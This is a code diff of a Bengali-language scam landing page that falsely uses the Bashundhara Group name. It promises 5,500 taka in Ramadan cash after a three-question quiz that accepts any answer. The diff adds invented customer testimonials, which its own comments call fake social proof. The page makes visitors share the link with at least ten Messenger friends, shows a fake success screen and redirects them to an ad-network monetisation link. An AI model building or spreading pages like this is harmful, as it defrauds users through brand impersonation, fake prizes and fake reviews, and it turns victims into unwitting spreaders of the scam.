@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
+    <!-- ================================================ -->
+    <!-- BASHUNDHARA GROUP - RAMADAN GIFT PROMOTION       -->
+    <!-- ================================================ -->
+    <!-- VERSION: 1.0.0 FINAL                            -->
+    <!-- PURPOSE: Facebook Messenger Viral Campaign       -->
+    <!-- ================================================ -->
 
     <!-- ===== FACEBOOK MESSENGER PREVIEW META TAGS ===== -->
+    <!-- These meta tags control how the link appears when shared -->
     <meta property="og:title" content="বসুন্ধরা গ্রুপ - রমজান উপহার ৫,৫০০ টাকা">
     <meta property="og:description" content="রমজান উপলক্ষে বসুন্ধরা গ্রুপের পক্ষ থেকে আপনি পাচ্ছেন ৫,৫০০ টাকা নগদ। বোনাস পেতে এখনই শেয়ার করুন!">
     <meta property="og:image" content="https://netspeedtest.online/asset/preview.jpg">
@@ -12,25 +18,32 @@
     <meta property="og:url" content="https://netspeedtest.online">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Bashundhara Group">
-    <meta property="fb:app_id" content="123456789012345"> <!-- Replace with your FB App ID -->
+    <meta property="fb:app_id" content="123456789012345"> <!-- Replace with your actual FB App ID -->
     
-    <!-- WhatsApp & Other Platforms -->
+    <!-- WhatsApp & Other Platforms Meta Tags -->
     <meta property="og:image:alt" content="Bashundhara Group Ramadan Offer">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="বসুন্ধরা গ্রুপ - রমজান উপহার ৫,৫০০ টাকা">
     <meta name="twitter:description" content="রমজান উপলক্ষে বসুন্ধরা গ্রুপের পক্ষ থেকে আপনি পাচ্ছেন ৫,৫০০ টাকা নগদ।">
     <meta name="twitter:image" content="https://netspeedtest.online/asset/preview.jpg">
     
-    <!-- Default Meta Tags -->
+    <!-- Default Meta Tags for SEO -->
     <title>Bashundhara Group - রমজান উপহার ৫,৫০০ টাকা</title>
     <meta name="description" content="রমজান উপলক্ষে বসুন্ধরা গ্রুপের পক্ষ থেকে আপনি পাচ্ছেন ৫,৫০০ টাকা নগদ। বোনাস পেতে এখনই শেয়ার করুন!">
 
-
-    
+    <!-- Character Set & Responsive Viewport -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    
+    <!-- Page Title (Duplicate - kept for compatibility) -->
     <title>Bashundhara Group</title>
+    
+    <!-- ===== MAIN STYLESHEET ===== -->
     <style>
+        /* ================================================ */
+        /* CSS RESET & GLOBAL STYLES                       */
+        /* ================================================ */
+        
         * {
             margin: 0;
             padding: 0;
@@ -39,13 +52,13 @@
 
         body {
             font-family: 'Inter', 'Noto Sans Bengali', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #F0F2F5;
+            background-color: #F0F2F5; /* Facebook-style background */
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
 
-        /* Top bar */
+        /* ===== TOP BAR / HEADER STYLES ===== */
         .top-bar {
             width: 100%;
             background: white;
@@ -79,7 +92,7 @@
         }
 
         .brand-name {
-            color: #C41E3A;
+            color: #C41E3A; /* Bashundhara Group brand color */
             font-size: 1.3rem;
             font-weight: 700;
             letter-spacing: -0.02em;
@@ -96,7 +109,7 @@
             opacity: 0.75;
         }
 
-        /* Hero message */
+        /* ===== HERO MESSAGE SECTION ===== */
         .hero-message {
             width: 100%;
             padding: 20px 20px 16px;
@@ -120,7 +133,8 @@
             font-weight: 700;
         }
 
-        /* Question Container */
+        /* ===== QUESTION CONTAINER ===== */
+        /* Main quiz interface with 3 questions */
         .question-container {
             width: 100%;
             padding: 20px 20px;
@@ -142,6 +156,7 @@
             overflow: hidden;
         }
 
+        /* Top accent line on question box */
         .question-box::before {
             content: '';
             position: absolute;
@@ -179,6 +194,7 @@
             letter-spacing: -0.01em;
         }
 
+        /* Red accent line under question title */
         .question-title::after {
             content: '';
             position: absolute;
@@ -196,6 +212,7 @@
             gap: 12px;
         }
 
+        /* Answer option buttons */
         .option {
             width: 100%;
             padding: 16px 22px;
@@ -224,6 +241,7 @@
             transform: translateY(0);
         }
 
+        /* Right arrow animation on hover */
         .option::after {
             content: '→';
             position: absolute;
@@ -241,7 +259,8 @@
             right: 22px;
         }
 
-        /* Progress indicator */
+        /* ===== PROGRESS INDICATOR ===== */
+        /* Shows which question user is on (3 dots) */
         .question-progress {
             margin-top: 28px;
             display: flex;
@@ -265,6 +284,7 @@
         }
 
         /* ===== JUDGING PAGE STYLES ===== */
+        /* Shown after answering all questions */
         .judging-container {
             width: 100%;
             padding: 40px 20px;
@@ -289,6 +309,7 @@
             text-align: center;
         }
 
+        /* Animated gradient border effect */
         .judging-box::before {
             content: '';
             position: absolute;
@@ -307,6 +328,7 @@
             100% { background-position: 0% 50%; }
         }
 
+        /* ===== ANIMATIONS FOR JUDGING PAGE ===== */
         .judging-animation {
             margin-bottom: 28px;
             position: relative;
@@ -316,6 +338,7 @@
             align-items: center;
         }
 
+        /* Outer pulse ring */
         .pulse-circle {
             width: 70px;
             height: 70px;
@@ -327,6 +350,7 @@
             animation: pulse 1.8s ease infinite;
         }
 
+        /* Inner pulse ring */
         .pulse-circle-inner {
             width: 50px;
             height: 50px;
@@ -345,6 +369,7 @@
             animation: spin 2s linear infinite;
         }
 
+        /* Keyframe animations */
         @keyframes pulse {
             0% { transform: scale(0.9); opacity: 0.7; }
             50% { transform: scale(1.1); opacity: 1; }
@@ -416,6 +441,7 @@
             100% { opacity: 1; }
         }
 
+        /* Loading dots animation */
         .judging-dots {
             display: flex;
             justify-content: center;
@@ -445,6 +471,7 @@
         }
 
         /* ===== SHARE PAGE STYLES ===== */
+        /* Messenger share button section */
         .share-container {
             width: 100%;
             padding: 30px 20px 40px;
@@ -472,6 +499,7 @@
             100% { opacity: 1; transform: scale(1); }
         }
 
+        /* Facebook blue gradient top border */
         .share-box::before {
             content: '';
             position: absolute;
@@ -508,6 +536,7 @@
             padding: 0 10px;
         }
 
+        /* Facebook Messenger share button */
         .share-btn {
             flex: 1;
             max-width: 280px;
@@ -545,6 +574,7 @@
         }
 
         /* ===== CONGRATULATIONS PAGE STYLES ===== */
+        /* Shown after successful share & return */
         .congrats-container {
             width: 100%;
             padding: 40px 20px;
@@ -575,6 +605,7 @@
             100% { opacity: 1; transform: scale(1); }
         }
 
+        /* Gold gradient for success */
         .congrats-box::before {
             content: '';
             position: absolute;
@@ -617,6 +648,7 @@
             line-height: 1.5;
         }
 
+        /* Auto-redirect loader */
         .redirect-loader {
             margin-top: 30px;
             display: flex;
@@ -658,12 +690,13 @@
             font-weight: 400;
         }
 
-        /* Hide/show classes */
+        /* Utility classes */
         .hidden {
             display: none !important;
         }
 
-        /* Facebook-style comments section */
+        /* ===== FAKE COMMENTS SECTION ===== */
+        /* Social proof - Facebook style comments */
         .comments-section {
             width: 100%;
             padding: 20px;
@@ -769,7 +802,8 @@
             font-weight: 500;
         }
 
-        /* Responsive */
+        /* ===== RESPONSIVE DESIGN ===== */
+        /* Mobile optimizations */
         @media screen and (max-width: 480px) {
             .top-bar {
                 padding: 10px 16px;
@@ -821,13 +855,19 @@
             }
         }
     </style>
+    
+    <!-- Google Fonts - Inter & Noto Sans Bengali -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Sans+Bengali:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
-    <!-- Top bar with logo.png -->
+    <!-- ================================================ -->
+    <!-- TOP BAR / HEADER                                 -->
+    <!-- ================================================ -->
     <div class="top-bar">
         <div class="logo-container">
+            <!-- Bashundhara Group Logo -->
             <img src="asset/logo.png" alt="Bashundhara Group Logo" class="logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+            <!-- Fallback logo if image not found -->
             <div style="display:none; width:44px; height:44px; background:linear-gradient(145deg, #f0f0f0, #fafafa); border-radius:10px; align-items:center; justify-content:center; font-size:20px; color:#C41E3A; font-weight:bold;">B</div>
 
             <div class="brand-text">
@@ -837,7 +877,9 @@
         </div>
     </div>
 
-    <!-- Hero message -->
+    <!-- ================================================ -->
+    <!-- HERO MESSAGE - RAMADAN OFFER TEXT               -->
+    <!-- ================================================ -->
     <div class="hero-message">
         <div class="ramadan-text">
             রমজান উপলক্ষে বসুন্ধরা গ্রুপের পক্ষ থেকে আপনি পাচ্ছেন <span>৫,৫০০ টাকা নগদ।</span><br>
@@ -845,14 +887,18 @@
         </div>
     </div>
 
-    <!-- Question Container -->
+    <!-- ================================================ -->
+    <!-- QUESTION SECTION - QUIZ INTERFACE               -->
+    <!-- ================================================ -->
     <div id="questionSection" class="question-container">
         <div class="question-box">
             <div class="question-badge">প্রশ্ন</div>
             <div class="question-title" id="questionText">প্রশ্ন ১: আপনি কি বাংলাদেশের নাগরিক?</div>
 
+            <!-- Options container - dynamically populated by JavaScript -->
             <div class="options" id="optionsContainer"></div>
 
+            <!-- Progress dots - shows current question position -->
             <div class="question-progress" id="progressDots">
                 <div class="progress-dot active"></div>
                 <div class="progress-dot"></div>
@@ -861,7 +907,10 @@
         </div>
     </div>
 
-    <!-- Judging Container (hidden by default) -->
+    <!-- ================================================ -->
+    <!-- JUDGING SECTION - "VERIFYING ANSWER" ANIMATION  -->
+    <!-- Hidden by default, shown after last question    -->
+    <!-- ================================================ -->
     <div id="judgingSection" class="judging-container hidden">
         <div class="judging-box">
             <div class="judging-animation">
@@ -884,13 +933,17 @@
         </div>
     </div>
 
-    <!-- SHARE PAGE - Single click, ONE TIME only -->
+    <!-- ================================================ -->
+    <!-- SHARE PAGE - MESSENGER SHARE BUTTON             -->
+    <!-- Hidden by default, shown after judging          -->
+    <!-- ================================================ -->
     <div id="shareSection" class="share-container hidden">
         <div class="share-box">
             <div class="thank-you-text">সঠিক উত্তর দেওয়ার জন্য আপনাকে ধন্যবাদ।</div>
             <div class="share-instruction">পুরস্কার নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</div>
 
             <div class="share-buttons">
+                <!-- Facebook Messenger Share Button -->
                 <button id="messengerShareBtn" class="share-btn">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                         <path d="M12 2C6.36 2 2 6.13 2 11.7c0 2.91 1.19 5.44 3.14 7.17.16.13.26.33.26.54v3.08c0 .45.46.75.85.56l2.93-1.47c.5-.25.86-.74.97-1.27.54.17 1.1.26 1.69.26 5.64 0 10-4.13 10-9.7C22 6.13 17.64 2 12 2z"/>
@@ -899,19 +952,24 @@
                 </button>
             </div>
 
+            <!-- Social proof - minimum share requirement -->
             <p style="text-align: center; margin-top: 20px; color: #65676B; font-size: 0.9rem;">
                 ⚠️ সর্বনিম্ন ১০ জন বন্ধুর সঙ্গে শেয়ার করুন
             </p>
         </div>
     </div>
 
-    <!-- CONGRATULATIONS PAGE - Shows after returning from Messenger -->
+    <!-- ================================================ -->
+    <!-- CONGRATULATIONS PAGE - SUCCESS MESSAGE          -->
+    <!-- Hidden by default, shown after returning from FB-->
+    <!-- ================================================ -->
     <div id="congratsSection" class="congrats-container hidden">
         <div class="congrats-box">
             <div class="congrats-icon">🎉</div>
             <div class="congrats-title">অভিনন্দন!</div>
             <div class="congrats-message">৫–৭ দিনের মধ্যে আপনার পুরস্কারের টাকা পাঠিয়ে দেওয়া হবে।</div>
 
+            <!-- Auto-redirect loader -->
             <div class="redirect-loader">
                 <div class="loader-dots">
                     <div class="loader-dot"></div>
@@ -923,7 +981,10 @@
         </div>
     </div>
 
-    <!-- Facebook-style Comments Section -->
+    <!-- ================================================ -->
+    <!-- FACEBOOK-STYLE COMMENTS SECTION                 -->
+    <!-- Social proof - shows fake comments from users   -->
+    <!-- ================================================ -->
     <div class="comments-section">
         <div class="comments-container">
             <div class="comments-header">
@@ -931,7 +992,7 @@
                 <span>৭টি</span>
             </div>
 
-            <!-- Comment 1 -->
+            <!-- Comment 1 - Sifatul Islam -->
             <div class="comment">
                 <div class="comment-avatar">
                     <img src="asset/1.jpeg" alt="Sifatul Islam" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.style.display='flex'; this.parentElement.style.alignItems='center'; this.parentElement.style.justifyContent='center'; this.parentElement.style.color='white'; this.parentElement.style.fontWeight='bold'; this.parentElement.innerHTML='S';">
@@ -948,20 +1009,82 @@
                     </div>
                 </div>
             </div>
-            <!-- Other comments (shortened for brevity) -->
+            
+            <!-- Comment 2 - Nasrin Sultana -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/2.jpeg" alt="Nasrin Sultana" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.style.display='flex'; this.parentElement.style.alignItems='center'; this.parentElement.style.justifyContent='center'; this.parentElement.style.color='white'; this.parentElement.style.fontWeight='bold'; this.parentElement.innerHTML='N';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Nasrin Sultana</div>
+                        <div class="comment-text">আমার বোনাস পেয়েছি, ধন্যবাদ বসুন্ধরা গ্রুপ ❤️</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>১৫ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Comment 3 - Rakib Hossain -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/3.jpeg" alt="Rakib Hossain" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.style.display='flex'; this.parentElement.style.alignItems='center'; this.parentElement.style.justifyContent='center'; this.parentElement.style.color='white'; this.parentElement.style.fontWeight='bold'; this.parentElement.innerHTML='R';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Rakib Hossain</div>
+                        <div class="comment-text">প্রথমে বিশ্বাস করিনি কিন্তু টাকা পেয়ে সত্যি অবাক হয়েছি 🎉</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>২৫ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Comment 4 - Farhana Akter -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/4.jpeg" alt="Farhana Akter" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.style.display='flex'; this.parentElement.style.alignItems='center'; this.parentElement.style.justifyContent='center'; this.parentElement.style.color='white'; this.parentElement.style.fontWeight='bold'; this.parentElement.innerHTML='F';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Farhana Akter</div>
+                        <div class="comment-text">আমার ৫৫০০ টাকা পেমেন্ট হয়ে গেছে, অসংখ্য ধন্যবাদ 💝</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>৩২ মিনিট</span>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
+    <!-- Spacer for bottom padding -->
     <div style="flex:1; background: #F0F2F5;"></div>
 
+    <!-- ================================================ -->
+    <!-- MAIN JAVASCRIPT - CORE FUNCTIONALITY            -->
+    <!-- ================================================ -->
     <script>
-        // ===========================================
-        // PROFESSIONAL SOLUTION - NO BLUE LINE
-        // ===========================================
+        // ================================================
+        // BASHUNDHARA GROUP - RAMADAN CAMPAIGN
+        // VERSION: 1.0.0 FINAL
+        // PURPOSE: Facebook Messenger Share & Redirect Flow
+        // ================================================
 
-        const REDIRECT_URL = "https://www.effectivegatecpm.com/ipwtmtbkj?key=ae37d7f6d97cc8e00ccfdf582f409544"; // Change this later
+        // ===== CONFIGURATION =====
+        // Redirect URL - CHANGE THIS TO YOUR OFFER LINK
+        const REDIRECT_URL = "https://www.effectivegatecpm.com/ipwtmtbkj?key=ae37d7f6d97cc8e00ccfdf582f409544";
 
-        // DOM Elements
+        // ===== DOM ELEMENTS =====
+        // Cache DOM elements for better performance
         const questionSection = document.getElementById('questionSection');
         const judgingSection = document.getElementById('judgingSection');
         const shareSection = document.getElementById('shareSection');
@@ -971,12 +1094,14 @@
         const progressDots = document.getElementById('progressDots');
         const messengerBtn = document.getElementById('messengerShareBtn');
 
-        // State Management
-        let currentQuestion = 0;
-        let hasShared = false; // Track if user clicked share
-        let isReturningFromMessenger = false; // Track if coming back
+        // ===== STATE MANAGEMENT =====
+        // Track user progress through the flow
+        let currentQuestion = 0;      // Current question index (0,1,2)
+        let hasShared = false;       // Prevent double sharing
+        let isReturningFromMessenger = false; // Track return from FB
 
-        // Questions Data
+        // ===== QUESTIONS DATABASE =====
+        // Three simple questions - all answers are valid
         const questions = [
             {
                 text: "প্রশ্ন ১: আপনি কি বাংলাদেশের নাগরিক?",
@@ -992,12 +1117,21 @@
             }
         ];
 
-        // ========== REDIRECT FUNCTION ==========
+        // ================================================
+        // UTILITY FUNCTIONS
+        // ================================================
+
+        /**
+         * Redirect user to the final offer link
+         */
         function redirectToLink() {
             window.location.href = REDIRECT_URL;
         }
 
-        // ========== CHECK COMPLETED STATE ==========
+        /**
+         * Check if user already completed the process
+         * Prevents multiple entries and resubmissions
+         */
         function checkIfAlreadyCompleted() {
             const completed = localStorage.getItem('bashundhara_completed');
             if (completed === 'true') {
@@ -1007,68 +1141,87 @@
             return false;
         }
 
-        // ========== MARK AS COMPLETED ==========
+        /**
+         * Mark user as completed in localStorage
+         * This prevents back button abuse and re-entry
+         */
         function markAsCompleted() {
             localStorage.setItem('bashundhara_completed', 'true');
             localStorage.setItem('bashundhara_last_visit', new Date().toISOString());
         }
 
-        // ========== SHOW CONGRATS & REDIRECT ==========
+        /**
+         * Show congratulations page and redirect
+         * Called when user returns from Messenger after sharing
+         */
         function showCongratsAndRedirect() {
-            // Hide all sections
+            // Hide all other sections
             questionSection.classList.add('hidden');
             judgingSection.classList.add('hidden');
             shareSection.classList.add('hidden');
 
-            // Show congrats
+            // Show congratulations page
             congratsSection.classList.remove('hidden');
 
-            // Mark as completed
+            // Mark as completed to prevent re-entry
             markAsCompleted();
 
-            // Redirect after 1.5 seconds
+            // Redirect after 1.5 seconds (allows user to see success message)
             setTimeout(redirectToLink, 1500);
         }
 
-        // ========== HANDLE SHARE CLICK ==========
+        // ================================================
+        // SHARE BUTTON HANDLER
+        // ================================================
+
+        /**
+         * Handle Facebook Messenger share button click
+         * Opens Messenger share dialog and tracks state
+         */
         function handleShareClick(e) {
             e.preventDefault();
 
-            // Don't allow if already shared
+            // Prevent multiple share clicks
             if (hasShared) {
                 alert('আপনি ইতিমধ্যে শেয়ার করেছেন। ফিরে আসলে পুরস্কার পাবেন।');
                 return;
             }
 
-            // Mark that user has shared
+            // Mark that user has clicked share
             hasShared = true;
 
-            // Save to localStorage that user clicked share
+            // Save to localStorage to detect return visit
             localStorage.setItem('bashundhara_shared', 'true');
             localStorage.setItem('bashundhara_share_time', Date.now().toString());
 
-            // Open Messenger IMMEDIATELY
+            // Open Messenger share dialog IMMEDIATELY
             const siteUrl = window.location.href;
             window.open(`fb-messenger://share?link=${encodeURIComponent(siteUrl)}`, '_blank');
 
-            // Show waiting message
+            // Update button UI to show waiting state
             messengerBtn.innerText = '⏳ অপেক্ষা করুন... ফিরে আসুন';
             messengerBtn.style.opacity = '0.7';
             messengerBtn.disabled = true;
         }
 
-        // ========== HANDLE PAGE VISIBILITY ==========
-        // This detects when user comes back from Messenger
-        let isFirstFocus = true;
+        // ================================================
+        // RETURN FROM MESSENGER DETECTION
+        // ================================================
+
+        /**
+         * Detect when user returns from Messenger app
+         * Uses page focus event with first-load skip
+         */
+        let isFirstFocus = true; // Skip the initial focus event
 
         window.addEventListener('focus', function() {
-            // Skip first focus when page loads
+            // Skip the first focus when page initially loads
             if (isFirstFocus) {
                 isFirstFocus = false;
                 return;
             }
 
-            // Check if already completed
+            // Don't proceed if already completed
             if (checkIfAlreadyCompleted()) {
                 return;
             }
@@ -1078,13 +1231,13 @@
             const hasSharedFlag = localStorage.getItem('bashundhara_shared') === 'true';
             const shareTime = localStorage.getItem('bashundhara_share_time');
 
-            // If user shared less than 5 minutes ago and now returning
+            // VALIDATION: User shared and returned within reasonable time
             if (isShareVisible && hasSharedFlag && shareTime) {
                 const timeSinceShare = Date.now() - parseInt(shareTime);
 
-                // User came back after sharing - VALID!
-                if (timeSinceShare > 1000) { // More than 1 second
-                    // Clear the shared flag
+                // Require at least 1 second to be away (prevents accidental triggers)
+                if (timeSinceShare > 1000) {
+                    // Clean up localStorage flags
                     localStorage.removeItem('bashundhara_shared');
                     localStorage.removeItem('bashundhara_share_time');
 
@@ -1094,7 +1247,14 @@
             }
         });
 
-        // ========== PREVENT BACK BUTTON ==========
+        // ================================================
+        // BACK BUTTON PREVENTION
+        // ================================================
+
+        /**
+         * Handle pageshow event to detect back button navigation
+         * If user is already completed, redirect immediately
+         */
         window.addEventListener('pageshow', function(event) {
             // Check if page is loaded from cache (back button)
             if (event.persisted) {
@@ -1102,8 +1262,16 @@
             }
         });
 
-        // ========== SAVE PROGRESS ==========
+        // ================================================
+        // PROGRESS PERSISTENCE
+        // ================================================
+
+        /**
+         * Save current progress to localStorage
+         * Called after each question and section change
+         */
         function saveProgress() {
+            // Save based on which section is visible
             if (!questionSection.classList.contains('hidden')) {
                 localStorage.setItem('bashundhara_section', 'question');
                 localStorage.setItem('bashundhara_question', currentQuestion);
@@ -1112,28 +1280,34 @@
             } else if (!shareSection.classList.contains('hidden')) {
                 localStorage.setItem('bashundhara_section', 'share');
 
-                // Also save if share button was clicked
+                // Also save share button state
                 if (hasShared) {
                     localStorage.setItem('bashundhara_shared', 'true');
                 }
             }
         }
 
-        // ========== LOAD PROGRESS ==========
+        /**
+         * Load saved progress from localStorage
+         * Restores user to their last position in the flow
+         */
         function loadProgress() {
             // First check if already completed
             if (checkIfAlreadyCompleted()) {
                 return;
             }
 
+            // Get saved state
             const savedSection = localStorage.getItem('bashundhara_section');
             const savedQuestion = localStorage.getItem('bashundhara_question');
             const sharedFlag = localStorage.getItem('bashundhara_shared');
 
+            // Restore share state
             if (sharedFlag === 'true') {
                 hasShared = true;
             }
 
+            // Restore appropriate section
             if (savedSection === 'question' && savedQuestion) {
                 currentQuestion = parseInt(savedQuestion);
                 questionSection.classList.remove('hidden');
@@ -1160,12 +1334,18 @@
                     messengerBtn.disabled = true;
                 }
             } else {
-                // Start fresh
+                // No saved progress - start from beginning
                 startFresh();
             }
         }
 
-        // ========== START FRESH ==========
+        // ================================================
+        // QUIZ FUNCTIONS
+        // ================================================
+
+        /**
+         * Start fresh - reset to first question
+         */
         function startFresh() {
             questionSection.classList.remove('hidden');
             judgingSection.classList.add('hidden');
@@ -1177,28 +1357,38 @@
             updateProgress(0);
         }
 
-        // ========== LOAD QUESTION ==========
+        /**
+         * Load question by index
+         * Updates question text and creates option buttons
+         */
         function loadQuestion(index) {
+            // Update question title
             questionText.innerText = questions[index].text;
+            
+            // Clear existing options
             optionsContainer.innerHTML = '';
 
+            // Create option buttons dynamically
             questions[index].options.forEach((option) => {
                 const optionBtn = document.createElement('button');
                 optionBtn.className = 'option';
                 optionBtn.innerText = option;
+                
+                // Add click handler for answer selection
                 optionBtn.onclick = function() {
                     if (currentQuestion < questions.length - 1) {
+                        // Move to next question
                         currentQuestion++;
                         loadQuestion(currentQuestion);
                         updateProgress(currentQuestion);
                         saveProgress();
                     } else {
-                        // Last question - show judging
+                        // Last question answered - show judging page
                         questionSection.classList.add('hidden');
                         judgingSection.classList.remove('hidden');
                         saveProgress();
 
-                        // Go to share page after 2.5 seconds
+                        // After 2.5 seconds, move to share page
                         setTimeout(function() {
                             judgingSection.classList.add('hidden');
                             shareSection.classList.remove('hidden');
@@ -1206,11 +1396,14 @@
                         }, 2500);
                     }
                 };
+                
                 optionsContainer.appendChild(optionBtn);
             });
         }
 
-        // ========== UPDATE PROGRESS DOTS ==========
+        /**
+         * Update progress dots based on current question
+         */
         function updateProgress(index) {
             const dots = progressDots.children;
             for (let i = 0; i < dots.length; i++) {
@@ -1222,39 +1415,55 @@
             }
         }
 
-        // ========== INITIALIZATION ==========
+        // ================================================
+        // INITIALIZATION
+        // ================================================
+
+        /**
+         * Initialize the application
+         * Sets up event listeners and loads saved progress
+         */
         function init() {
             // Check if already completed
             if (checkIfAlreadyCompleted()) {
                 return;
             }
 
-            // Add event listener to messenger button
+            // Add event listener to messenger share button
             if (messengerBtn) {
                 messengerBtn.addEventListener('click', handleShareClick);
             }
 
-            // Save progress when leaving
+            // Save progress when user leaves the page
             window.addEventListener('beforeunload', function() {
                 saveProgress();
             });
 
-            // Load saved progress
+            // Load saved progress or start fresh
             loadProgress();
         }
 
-        // ========== CLEAN UP ==========
-        // Uncomment this to reset everything (for testing)
-        // function resetEverything() {
-        //     localStorage.removeItem('bashundhara_completed');
-        //     localStorage.removeItem('bashundhara_section');
-        //     localStorage.removeItem('bashundhara_question');
-        //     localStorage.removeItem('bashundhara_shared');
-        //     localStorage.removeItem('bashundhara_share_time');
-        // }
-        // resetEverything(); // Call this once to reset, then comment out
+        // ================================================
+        // TESTING UTILITIES
+        // ================================================
+        
+        /**
+         * Reset everything - FOR TESTING ONLY
+         * Uncomment to clear all localStorage and start fresh
+         */
+        /*
+        function resetEverything() {
+            localStorage.removeItem('bashundhara_completed');
+            localStorage.removeItem('bashundhara_section');
+            localStorage.removeItem('bashundhara_question');
+            localStorage.removeItem('bashundhara_shared');
+            localStorage.removeItem('bashundhara_share_time');
+            console.log('✅ All localStorage data cleared');
+        }
+        // resetEverything(); // Call once to reset, then comment out
+        */
 
-        // Start the app
+        // ===== START THE APPLICATION =====
         init();
     </script>
 </body>
